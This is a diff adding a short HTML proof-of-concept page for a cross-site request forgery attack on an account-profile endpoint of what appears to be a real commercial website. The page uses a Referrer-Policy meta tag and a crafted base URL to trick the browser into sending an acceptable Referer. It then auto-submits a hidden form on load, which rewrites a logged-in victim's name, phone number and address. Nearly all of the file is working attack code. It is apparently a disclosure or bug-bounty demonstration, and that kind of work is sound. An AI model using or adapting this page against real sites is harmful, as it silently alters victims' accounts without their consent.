@@ -1,1 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Emulate the HTTP header "Referrer-Policy: unsafe-url" -->
+  <meta http-equiv="Referrer-Policy" content="unsafe-url">
+  <!-- Trick Chrome into using this as the Referer (authority+path) -->
+  <base href="https://nayssers.github.io\@www.cat.com/">
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <form id="csrf" method="POST"
+        action="/content/catdotcom/en_US/account/myaccount/account-information/
+                jcr:content/root/responsivegrid_1010483686
+                /userprofile.updateUserProfile.html">
+    <input type="hidden" name="givenname"        value="haNaysserlwsms">
+    <input type="hidden" name="sn"               value="NayssersoL">
+    <input type="hidden" name="telephonenumber"   value="+212609-748252">
+    <input type="hidden" name="c"                value="MA">
+    <input type="hidden" name="st"               value="Marrakesh-Safi">
+    <input type="hidden" name="postalcode"       value="40000">
+    <input type="hidden" name="o"                value="Naysset">
+    <input type="hidden" name="userProfile"      value="true">
+  </form>
+
+  <script>
+    // Auto‑submit the form on load
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
 
